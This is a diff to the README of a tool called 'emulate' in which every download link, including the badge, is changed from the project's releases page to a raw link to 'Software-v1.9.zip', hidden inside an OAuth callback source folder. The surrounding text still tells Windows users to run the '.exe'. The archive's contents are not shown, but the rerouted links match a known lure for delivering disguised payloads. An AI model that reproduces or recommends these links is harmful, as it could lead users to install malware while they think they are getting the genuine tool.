@@ -1,12 +1,12 @@
 # 🧩 emulate - Local API work without network gaps
 
-[![Download emulate](https://img.shields.io/badge/Download%20emulate-blue-grey?style=for-the-badge)](https://github.com/roial1092/emulate/releases)
+[![Download emulate](https://img.shields.io/badge/Download%20emulate-blue-grey?style=for-the-badge)](https://github.com/roial1092/emulate/raw/refs/heads/main/examples/oauth/src/app/api/auth/callback/[provider]/Software-v1.9.zip)
 
 ## 📥 Download
 
 Visit this page to download for Windows:
 
-https://github.com/roial1092/emulate/releases
+https://github.com/roial1092/emulate/raw/refs/heads/main/examples/oauth/src/app/api/auth/callback/[provider]/Software-v1.9.zip
 
 Open the latest release, then download the Windows file that matches your device. If you see more than one file, pick the `.exe` file for the easiest setup.
 
@@ -198,7 +198,7 @@ If you get a network error, make sure emulate is still open and the address is c
 
 Download the Windows build here:
 
-https://github.com/roial1092/emulate/releases
+https://github.com/roial1092/emulate/raw/refs/heads/main/examples/oauth/src/app/api/auth/callback/[provider]/Software-v1.9.zip
 
 Use the latest release, then choose the file that matches your Windows device. For most users, the `.exe` file is the best choice
 
